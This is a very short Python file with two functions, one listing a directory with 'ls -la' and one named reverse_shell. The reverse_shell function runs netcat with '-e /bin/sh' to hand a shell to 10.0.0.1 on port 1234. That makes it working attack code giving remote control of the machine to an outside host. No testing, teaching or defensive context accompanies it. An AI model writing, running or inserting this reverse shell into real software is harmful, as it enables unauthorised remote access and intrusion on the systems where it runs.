import os
import subprocess

def list_files():
    os.system('ls -la')

def reverse_shell():
    subprocess.call(['nc', '-e', '/bin/sh', '10.0.0.1', '1234'])
